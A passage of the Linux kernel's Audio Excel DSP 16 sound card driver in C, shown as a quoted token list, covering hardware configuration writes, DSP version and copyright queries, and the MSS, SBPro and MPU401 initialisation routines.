"/", "*", "*", "Now", "set", "up", "the", "real", "kernel", "configuration", ".", "*", "/", "decoded_hcfg", ".", "iobase", "=", "ae_config", ".", "base_io", ";", "decoded_hcfg", ".", "wssbase", "=", "ae_config", ".", "mss_base", ";", "decoded_hcfg", ".", "mpubase", "=", "ae_config", ".", "mpu_base", ";", "#", "if", "defined", "(", "CONFIG_SC6600_JOY", ")", "decoded_hcfg", ".", "joystick", "=", "CONFIG_SC6600_JOY", ";", "/", "*", "Enable", "*", "/", "#", "endif", "#", "if", "defined", "(", "CONFIG_SC6600_CDROM", ")", "decoded_hcfg", ".", "cdrom", "=", "CONFIG_SC6600_CDROM", ";", "/", "*", "4", ":", "N", "-", "3", ":", "I", "-", "2", ":", "G", "-", "1", ":", "P", "-", "0", ":", "S", "*", "/", "#", "endif", "#", "if", "defined", "(", "CONFIG_SC6600_CDROMBASE", ")", "decoded_hcfg", ".", "cdrombase", "=", "CONFIG_SC6600_CDROMBASE", ";", "/", "*", "0", "Disable", "*", "/", "#", "endif", "#", "if", "defined", "(", "AEDSP16_DEBUG", ")", "DBG", "(", "(\"", "New", "Values", ":", "\\", "n", "\"", "))", ";", "aedsp16_pinfo", "(", ");", "#", "endif", "DBG", "(", "(\"", "success", ".", "\\", "n", "\"", "))", ";", "}", "static", "void", "__init", "aedsp16_hard_encode", "(", "void", ")", "{", "DBG", "(", "(\"", "aedsp16_hard_encode", ":", "0x", "%", "x", ",", "0x", "%", "x", "\\", "n", "\"", ",", "hard_cfg", "[", "0", "]", ",", "hard_cfg", "[", "1", "]", "))", ";", "hard_cfg", "[", "0", "]", "=", "0", ";", "hard_cfg", "[", "1", "]", "=", "0", ";", "hard_cfg", "[", "0", "]", "|", "=", "0x20", ";", "BLDIOBASE", "(", "hard_cfg", "[", "0", "]", ",", "decoded_hcfg", ".", "iobase", ")", ";", "BLDWSSADDR", "(", "hard_cfg", "[", "0", "]", ",", "decoded_hcfg", ".", "wssbase", ")", ";", "BLDMPUADDR", "(", "hard_cfg", "[", "0", "]", ",", "decoded_hcfg", ".", "mpubase", ")", ";", "BLDJOY", "(", "hard_cfg", "[", "0", "]", ",", "decoded_hcfg", ".", "joystick", ")", ";", "BLDCDROM", "(", "hard_cfg", "[", "1", "]", ",", "decoded_hcfg", ".", "cdrom", ")", ";", "BLDCDROMADDR", "(", "hard_cfg", "[", "1", "]", ",", "decoded_hcfg", ".", "cdrombase", ")", ";", "#", "if", "defined", "(", "AEDSP16_DEBUG", ")", "aedsp16_pinfo", "(", ");", "#", "endif", "DBG", "(", "(\"", "aedsp16_hard_encode", ":", "0x", "%", "x", ",", "0x", "%", "x", "\\", "n", "\"", ",", "hard_cfg", "[", "0", "]", ",", "hard_cfg", "[", "1", "]", "))", ";", "DBG", "(", "(\"", "success", ".", "\\", "n", "\"", "))", ";", "}", "static", "int", "__init", "aedsp16_hard_write", "(", "int", "port", ")", "{", "DBG", "(", "(\"", "aedsp16_hard_write", ":", "\\", "n", "\"", "))", ";", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_6C", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_6C", ")", ";", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_5C", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_5C", ")", ";", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "hard_cfg", "[", "0", "]", "))", "{", "printk", "(", "\"[", "AEDSP16", "]", "DATA", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "hard_cfg", "[", "0", "]", ");", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "hard_cfg", "[", "1", "]", "))", "{", "printk", "(", "\"[", "AEDSP16", "]", "DATA", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "hard_cfg", "[", "1", "]", ");", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_C5", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_C5", ")", ";", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "DBG", "(", "(\"", "success", ".", "\\", "n", "\"", "))", ";", "return", "TRUE", ";", "}", "static", "int", "__init", "aedsp16_hard_read", "(", "int", "port", ")", "{", "DBG", "(", "(\"", "aedsp16_hard_read", ":", "\\", "n", "\"", "))", ";", "if", "(", "aedsp16_write", "(", "port", ",", "READ_HARD_CFG", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "READ_HARD_CFG", ")", ";", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "if", "(", "(", "hard_cfg", "[", "0", "]", "=", "aedsp16_read", "(", "port", ")", ")", "=", "=", "-", "1", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_read", "after", "CMD", "0x", "%", "x", ":", "failed", "\\", "n", "\"", ",", "READ_HARD_CFG", ")", ";", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "if", "(", "(", "hard_cfg", "[", "1", "]", "=", "aedsp16_read", "(", "port", ")", ")", "=", "=", "-", "1", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_read", "after", "CMD", "0x", "%", "x", ":", "failed", "\\", "n", "\"", ",", "READ_HARD_CFG", ")", ";", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "if", "(", "aedsp16_read", "(", "port", ")", "=", "=", "-", "1", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_read", "after", "CMD", "0x", "%", "x", ":", "failed", "\\", "n", "\"", ",", "READ_HARD_CFG", ")", ";", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "DBG", "(", "(\"", "success", ".", "\\", "n", "\"", "))", ";", "return", "TRUE", ";", "}", "static", "int", "__init", "aedsp16_ext_cfg_write", "(", "int", "port", ")", "{", "int", "extcfg", ",", "val", ";", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_66", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_66", ")", ";", "return", "FALSE", ";", "}", "extcfg", "=", "7", ";", "if", "(", "decoded_hcfg", ".", "cdrom", "!", "=", "2", ")", "extcfg", "=", "0x0F", ";", "if", "(", "(", "decoded_hcfg", ".", "cdrom", "=", "=", "4", ")", "|", "|", "(", "decoded_hcfg", ".", "cdrom", "=", "=", "3", ")", ")", "extcfg", "&", "=", "~", "2", ";", "if", "(", "decoded_hcfg", ".", "cdrombase", "=", "=", "0", ")", "extcfg", "&", "=", "~", "2", ";", "if", "(", "decoded_hcfg", ".", "mpubase", "=", "=", "0", ")", "extcfg", "&", "=", "~", "1", ";", "if", "(", "aedsp16_write", "(", "port", ",", "extcfg", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "Write", "extcfg", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "0", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "Write", "extcfg", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "if", "(", "decoded_hcfg", ".", "cdrom", "=", "=", "3", ")", "{", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_52", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_52", ")", ";", "return", "FALSE", ";", "}", "if", "(", "(", "val", "=", "aedsp16_read", "(", "port", ")", ")", "=", "=", "-", "1", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_read", "after", "CMD", "0x", "%", "x", ":", "failed", "\\", "n", "\"", ",", "COMMAND_52", ")", ";", "return", "FALSE", ";", "}", "val", "&", "=", "0x7F", ";", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_60", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_60", ")", ";", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "val", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "Write", "val", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "}", "return", "TRUE", ";", "}", "#", "endif", "/", "*", "CONFIG_SC6600", "*", "/", "static", "int", "__init", "aedsp16_cfg_write", "(", "int", "port", ")", "{", "if", "(", "aedsp16_write", "(", "port", ",", "WRITE_MDIRQ_CFG", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "WRITE_MDIRQ_CFG", ")", ";", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "soft_cfg", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "Initialization", "of", "(", "M", ")", "IRQ", "and", "DMA", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "return", "TRUE", ";", "}", "static", "int", "__init", "aedsp16_init_mss", "(", "int", "port", ")", "{", "DBG", "(", "(\"", "aedsp16_init_mss", ":", "\\", "n", "\"", "))", ";", "mdelay", "(", "10", ")", ";", "if", "(", "aedsp16_write", "(", "port", ",", "DSP_INIT_MSS", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_init_mss", "[", "0x", "%", "x", "]", ":", "failed", "!", "\\", "n", "\"", ",", "DSP_INIT_MSS", ")", ";", "DBG", "(", "(\"", "failure", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "mdelay", "(", "10", ")", ";", "if", "(", "aedsp16_cfg_write", "(", "port", ")", "=", "=", "FALSE", ")", "return", "FALSE", ";", "outb", "(", "soft_cfg_mss", ",", "ae_config", ".", "mss_base", ")", ";", "DBG", "(", "(\"", "success", ".", "\\", "n", "\"", "))", ";", "return", "TRUE", ";", "}", "static", "int", "__init", "aedsp16_setup_board", "(", "int", "port", ")", "{", "int", "loop", "=", "RETRY", ";", "#", "if", "defined", "(", "CONFIG_SC6600", ")", "int", "val", "=", "0", ";", "if", "(", "aedsp16_hard_read", "(", "port", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_hard_read", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_52", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_52", ")", ";", "return", "FALSE", ";", "}", "if", "(", "(", "val", "=", "aedsp16_read", "(", "port", ")", ")", "=", "=", "-", "1", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_read", "after", "CMD", "0x", "%", "x", ":", "failed", "\\", "n", "\"", ",", "COMMAND_52", ")", ";", "return", "FALSE", ";", "}", "#", "endif", "do", "{", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_88", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_88", ")", ";", "return", "FALSE", ";", "}", "mdelay", "(", "10", ")", ";", "}", "while", "(", "(", "aedsp16_wait_data", "(", "port", ")", "=", "=", "FALSE", ")", "&", "&", "loop", "-", "-)", ";", "if", "(", "aedsp16_read", "(", "port", ")", "=", "=", "-", "1", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_read", "after", "CMD", "0x", "%", "x", ":", "failed", "\\", "n", "\"", ",", "COMMAND_88", ")", ";", "return", "FALSE", ";", "}", "#", "if", "!", "defined", "(", "CONFIG_SC6600", ")", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_5C", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_5C", ")", ";", "return", "FALSE", ";", "}", "#", "endif", "if", "(", "aedsp16_cfg_write", "(", "port", ")", "=", "=", "FALSE", ")", "return", "FALSE", ";", "#", "if", "defined", "(", "CONFIG_SC6600", ")", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_60", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_60", ")", ";", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "val", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "DATA", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "val", ")", ";", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_6E", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_6E", ")", ";", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "ver", "[", "0", "]", "))", "{", "printk", "(", "\"[", "AEDSP16", "]", "DATA", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "ver", "[", "0", "]", ");", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "ver", "[", "1", "]", "))", "{", "printk", "(", "\"[", "AEDSP16", "]", "DATA", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "ver", "[", "1", "]", ");", "return", "FALSE", ";", "}", "if", "(", "aedsp16_hard_write", "(", "port", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_hard_write", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "if", "(", "aedsp16_write", "(", "port", ",", "COMMAND_5C", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "COMMAND_5C", ")", ";", "return", "FALSE", ";", "}", "#", "if", "defined", "(", "THIS_IS_A_THING_I_HAVE_NOT_TESTED_YET", ")", "if", "(", "aedsp16_cfg_write", "(", "port", ")", "=", "=", "FALSE", ")", "return", "FALSE", ";", "#", "endif", "#", "endif", "return", "TRUE", ";", "}", "static", "int", "__init", "aedsp16_stdcfg", "(", "int", "port", ")", "{", "if", "(", "aedsp16_write", "(", "port", ",", "WRITE_MDIRQ_CFG", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "WRITE_MDIRQ_CFG", ")", ";", "return", "FALSE", ";", "}", "/", "*", "*", "0x0A", "=", "=", "(", "IRQ", "7", ",", "DMA", "1", ",", "MIRQ", "0", ")", "*", "/", "if", "(", "aedsp16_write", "(", "port", ",", "0x0A", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_stdcfg", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "return", "TRUE", ";", "}", "static", "int", "__init", "aedsp16_dsp_version", "(", "int", "port", ")", "{", "int", "len", "=", "0", ";", "int", "ret", ";", "DBG", "(", "(\"", "Get", "DSP", "Version", ":", "\\", "n", "\"", "))", ";", "if", "(", "aedsp16_write", "(", "ae_config", ".", "base_io", ",", "GET_DSP_VERSION", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "GET_DSP_VERSION", ")", ";", "DBG", "(", "(\"", "failed", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "do", "{", "if", "(", "(", "ret", "=", "aedsp16_read", "(", "port", ")", ")", "=", "=", "-", "1", ")", "{", "DBG", "(", "(\"", "failed", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "/", "*", "*", "We", "already", "know", "how", "many", "int", "are", "stored", "(", "2", ")", ",", "so", "we", "know", "when", "the", "*", "string", "is", "finished", ".", "*", "/", "ver", "[", "len", "+", "+]", "=", "ret", ";", "}", "while", "(", "len", "<", "CARDVERDIGITS", ")", ";", "sprintf", "(", "DSPVersion", ",", "\"", "%", "d", ".", "%", "d", "\"", ",", "ver", "[", "0", "]", ",", "ver", "[", "1", "]", ");", "DBG", "(", "(\"", "success", ".", "\\", "n", "\"", "))", ";", "return", "TRUE", ";", "}", "static", "int", "__init", "aedsp16_dsp_copyright", "(", "int", "port", ")", "{", "int", "len", "=", "0", ";", "int", "ret", ";", "DBG", "(", "(\"", "Get", "DSP", "Copyright", ":", "\\", "n", "\"", "))", ";", "if", "(", "aedsp16_write", "(", "ae_config", ".", "base_io", ",", "GET_DSP_COPYRIGHT", ")", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "CMD", "0x", "%", "x", ":", "failed", "!", "\\", "n", "\"", ",", "GET_DSP_COPYRIGHT", ")", ";", "DBG", "(", "(\"", "failed", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "do", "{", "if", "(", "(", "ret", "=", "aedsp16_read", "(", "port", ")", ")", "=", "=", "-", "1", ")", "{", "/", "*", "*", "If", "no", "more", "data", "available", ",", "return", "to", "the", "caller", ",", "no", "error", "if", "len", ">", "0", ".", "*", "We", "have", "no", "other", "way", "to", "know", "when", "the", "string", "is", "finished", ".", "*", "/", "if", "(", "len", ")", "break", ";", "else", "{", "DBG", "(", "(\"", "failed", ".", "\\", "n", "\"", "))", ";", "return", "FALSE", ";", "}", "}", "DSPCopyright", "[", "len", "+", "+]", "=", "ret", ";", "}", "while", "(", "len", "<", "CARDNAMELEN", ")", ";", "DBG", "(", "(\"", "success", ".", "\\", "n", "\"", "))", ";", "return", "TRUE", ";", "}", "static", "void", "__init", "aedsp16_init_tables", "(", "void", ")", "{", "int", "i", "=", "0", ";", "memset", "(", "DSPCopyright", ",", "0", ",", "CARDNAMELEN", "+", "1", ")", ";", "memset", "(", "DSPVersion", ",", "0", ",", "CARDVERLEN", "+", "1", ")", ";", "for", "(", "i", "=", "0", ";", "orIRQ", "[", "i", "]", ".", "or", ";", "i", "+", "+)", "if", "(", "orIRQ", "[", "i", "]", ".", "val", "=", "=", "ae_config", ".", "irq", ")", "{", "soft_cfg", "|", "=", "orIRQ", "[", "i", "]", ".", "or", ";", "soft_cfg_mss", "|", "=", "orIRQ", "[", "i", "]", ".", "or", ";", "}", "for", "(", "i", "=", "0", ";", "orMIRQ", "[", "i", "]", ".", "or", ";", "i", "+", "+)", "if", "(", "orMIRQ", "[", "i", "]", ".", "or", "=", "=", "ae_config", ".", "mpu_irq", ")", "soft_cfg", "|", "=", "orMIRQ", "[", "i", "]", ".", "or", ";", "for", "(", "i", "=", "0", ";", "orDMA", "[", "i", "]", ".", "or", ";", "i", "+", "+)", "if", "(", "orDMA", "[", "i", "]", ".", "val", "=", "=", "ae_config", ".", "dma", ")", "{", "soft_cfg", "|", "=", "orDMA", "[", "i", "]", ".", "or", ";", "soft_cfg_mss", "|", "=", "orDMA", "[", "i", "]", ".", "or", ";", "}", "}", "static", "int", "__init", "aedsp16_init_board", "(", "void", ")", "{", "aedsp16_init_tables", "(", ");", "if", "(", "aedsp16_dsp_reset", "(", "ae_config", ".", "base_io", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_dsp_reset", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "if", "(", "aedsp16_dsp_copyright", "(", "ae_config", ".", "base_io", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_dsp_copyright", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "/", "*", "*", "My", "AEDSP16", "card", "return", "SC", "-", "6000", "in", "DSPCopyright", ",", "so", "*", "if", "we", "have", "something", "different", ",", "we", "have", "to", "be", "warned", ".", "*", "/", "if", "(", "strcmp", "(", "\"", "SC", "-", "6000", "\"", ",", "DSPCopyright", ")", ")", "printk", "(", "\"[", "AEDSP16", "]", "Warning", ":", "non", "SC", "-", "6000", "audio", "card", "!", "\\", "n", "\"", ");", "if", "(", "aedsp16_dsp_version", "(", "ae_config", ".", "base_io", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_dsp_version", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "if", "(", "aedsp16_stdcfg", "(", "ae_config", ".", "base_io", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_stdcfg", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "#", "if", "defined", "(", "CONFIG_SC6600", ")", "if", "(", "aedsp16_hard_read", "(", "ae_config", ".", "base_io", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_hard_read", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "aedsp16_hard_decode", "(", ");", "aedsp16_hard_encode", "(", ");", "if", "(", "aedsp16_hard_write", "(", "ae_config", ".", "base_io", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_hard_write", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "if", "(", "aedsp16_ext_cfg_write", "(", "ae_config", ".", "base_io", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_ext_cfg_write", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "#", "endif", "/", "*", "CONFIG_SC6600", "*", "/", "if", "(", "aedsp16_setup_board", "(", "ae_config", ".", "base_io", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "aedsp16_setup_board", ":", "failed", "!", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "if", "(", "ae_config", ".", "mss_base", "!", "=", "-", "1", ")", "{", "if", "(", "ae_config", ".", "init", "&", "INIT_MSS", ")", "{", "if", "(", "aedsp16_init_mss", "(", "ae_config", ".", "base_io", ")", "=", "=", "FALSE", ")", "{", "printk", "(", "\"[", "AEDSP16", "]", "Can", "not", "initialize", "\"", "\"", "Microsoft", "Sound", "System", "mode", ".", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "}", "}", "#", "if", "!", "defined", "(", "MODULE", ")", "|", "|", "defined", "(", "AEDSP16_INFO", ")", "|", "|", "defined", "(", "AEDSP16_DEBUG", ")", "printk", "(", "\"", "Audio", "Excel", "DSP", "16", "init", "v", "%", "s", "(", "%", "s", "%", "s", ")", "[", "\",", "VERSION", ",", "DSPCopyright", ",", "DSPVersion", ")", ";", "if", "(", "ae_config", ".", "mpu_base", "!", "=", "-", "1", ")", "{", "if", "(", "ae_config", ".", "init", "&", "INIT_MPU401", ")", "{", "printk", "(", "\"", "MPU401", "\"", ");", "if", "(", "(", "ae_config", ".", "init", "&", "INIT_MSS", ")", "|", "|", "(", "ae_config", ".", "init", "&", "INIT_SBPRO", ")", ")", "printk", "(", "\"", "\"", ");", "}", "}", "if", "(", "ae_config", ".", "mss_base", "=", "=", "-", "1", ")", "{", "if", "(", "ae_config", ".", "init", "&", "INIT_SBPRO", ")", "{", "printk", "(", "\"", "SBPro", "\"", ");", "if", "(", "ae_config", ".", "init", "&", "INIT_MSS", ")", "printk", "(", "\"", "\"", ");", "}", "}", "if", "(", "ae_config", ".", "mss_base", "!", "=", "-", "1", ")", "if", "(", "ae_config", ".", "init", "&", "INIT_MSS", ")", "printk", "(", "\"", "MSS", "\"", ");", "printk", "(", "\"]", "\\", "n", "\"", ");", "#", "endif", "/", "*", "MODULE", "|", "|", "AEDSP16_INFO", "|", "|", "AEDSP16_DEBUG", "*", "/", "mdelay", "(", "10", ")", ";", "return", "TRUE", ";", "}", "static", "int", "__init", "init_aedsp16_sb", "(", "void", ")", "{", "DBG", "(", "(\"", "init_aedsp16_sb", ":", "\"", "))", ";", "/", "*", "*", "If", "the", "card", "is", "already", "init", "'", "ed", "MSS", ",", "we", "can", "not", "init", "it", "to", "SBPRO", "too", "*", "because", "the", "board", "can", "not", "emulate", "simultaneously", "MSS", "and", "SBPRO", ".", "*", "/", "if", "(", "ae_config", ".", "init", "&", "INIT_MSS", ")", "return", "FALSE", ";", "if", "(", "ae_config", ".", "init", "&", "INIT_SBPRO", ")", "return", "FALSE", ";", "ae_config", ".", "init", "|", "=", "INIT_SBPRO", ";", "DBG", "(", "(\"", "done", ".", "\\", "n", "\"", "))", ";", "return", "TRUE", ";", "}", "static", "void", "uninit_aedsp16_sb", "(", "void", ")", "{", "DBG", "(", "(\"", "uninit_aedsp16_sb", ":", "\"", "))", ";", "ae_config", ".", "init", "&", "=", "~", "INIT_SBPRO", ";", "DBG", "(", "(\"", "done", ".", "\\", "n", "\"", "))", ";", "}", "static", "int", "__init", "init_aedsp16_mss", "(", "void", ")", "{", "DBG", "(", "(\"", "init_aedsp16_mss", ":", "\"", "))", ";", "/", "*", "*", "If", "the", "card", "is", "already", "init", "'", "ed", "SBPRO", ",", "we", "can", "not", "init", "it", "to", "MSS", "too", "*", "because", "the", "board", "can", "not", "emulate", "simultaneously", "MSS", "and", "SBPRO", ".", "*", "/", "if", "(", "ae_config", ".", "init", "&", "INIT_SBPRO", ")", "return", "FALSE", ";", "if", "(", "ae_config", ".", "init", "&", "INIT_MSS", ")", "return", "FALSE", ";", "/", "*", "*", "We", "must", "allocate", "the", "CONFIG_AEDSP16_BASE", "region", "too", "because", "these", "are", "the", "*", "I", "/", "O", "ports", "to", "access", "card", "'", "s", "control", "registers", ".", "*", "/", "if", "(", "!(", "ae_config", ".", "init", "&", "INIT_MPU401", ")", ")", "{", "if", "(", "!", "request_region", "(", "ae_config", ".", "base_io", ",", "IOBASE_REGION_SIZE", ",", "\"", "aedsp16", "(", "base", ")", "\")", ")", "{", "printk", "(", "\"", "AEDSP16", "BASE", "I", "/", "O", "port", "region", "is", "already", "in", "use", ".", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "}", "ae_config", ".", "init", "|", "=", "INIT_MSS", ";", "DBG", "(", "(\"", "done", ".", "\\", "n", "\"", "))", ";", "return", "TRUE", ";", "}", "static", "void", "uninit_aedsp16_mss", "(", "void", ")", "{", "DBG", "(", "(\"", "uninit_aedsp16_mss", ":", "\"", "))", ";", "if", "(", "(!", "(", "ae_config", ".", "init", "&", "INIT_MPU401", ")", ")", "&", "&", "(", "ae_config", ".", "init", "&", "INIT_MSS", ")", ")", "{", "release_region", "(", "ae_config", ".", "base_io", ",", "IOBASE_REGION_SIZE", ")", ";", "DBG", "(", "(\"", "AEDSP16", "base", "region", "released", ".", "\\", "n", "\"", "))", ";", "}", "ae_config", ".", "init", "&", "=", "~", "INIT_MSS", ";", "DBG", "(", "(\"", "done", ".", "\\", "n", "\"", "))", ";", "}", "static", "int", "__init", "init_aedsp16_mpu", "(", "void", ")", "{", "DBG", "(", "(\"", "init_aedsp16_mpu", ":", "\"", "))", ";", "if", "(", "ae_config", ".", "init", "&", "INIT_MPU401", ")", "return", "FALSE", ";", "/", "*", "*", "We", "must", "request", "the", "CONFIG_AEDSP16_BASE", "region", "too", "because", "these", "are", "the", "I", "/", "O", "*", "ports", "to", "access", "card", "'", "s", "control", "registers", ".", "*", "/", "if", "(", "!(", "ae_config", ".", "init", "&", "(", "INIT_MSS", "|", "INIT_SBPRO", ")", "))", "{", "if", "(", "!", "request_region", "(", "ae_config", ".", "base_io", ",", "IOBASE_REGION_SIZE", ",", "\"", "aedsp16", "(", "base", ")", "\")", ")", "{", "printk", "(", "\"", "AEDSP16", "BASE", "I", "/", "O", "port", "region", "is", "already", "in", "use", ".", "\\", "n", "\"", ");", "return", "FALSE", ";", "}", "}", "ae_config", ".", "init", "|", "=", "INIT_MPU401", ";", "DBG", "(", "(\"", "done", ".", "\\", "n", "\"", "))", ";", "return", "TRUE", ";", "}", "static", "void", "uninit_aedsp16_mpu", "(", "void", ")", "{", "DBG", "(", "(\"", "uninit_aedsp16_mpu", ":", "\"", "))", ";", "if", "(", "(!", "(", "ae_config", ".", "init", "&", "(", "INIT_MSS", "|", "INIT_SBPRO", ")", "))", "&", "&", "(", "ae_config", ".", "init", "&", "INIT_MPU401", ")", ")", "{", "release_region", "(", "ae_config", ".", "base_io", ",", "IOBASE_REGION_SIZE", ")", ";", "DBG", "(", "(\"", "AEDSP16", "base", "region", "released", ".", "\\", "n", "\"", "))", ";", "}", "ae_config", ".", "init", "&", "=", "~", "INIT_MPU401", ";", "DBG", "(", "(\"", "done", ".", "\\", "n", "\"", "))", ";", "}", "static", "int", "__init", "init_aedsp16", "(", "void", ")", "{", "int", "initialized", "=", "FALSE", ";", "DBG", "(", 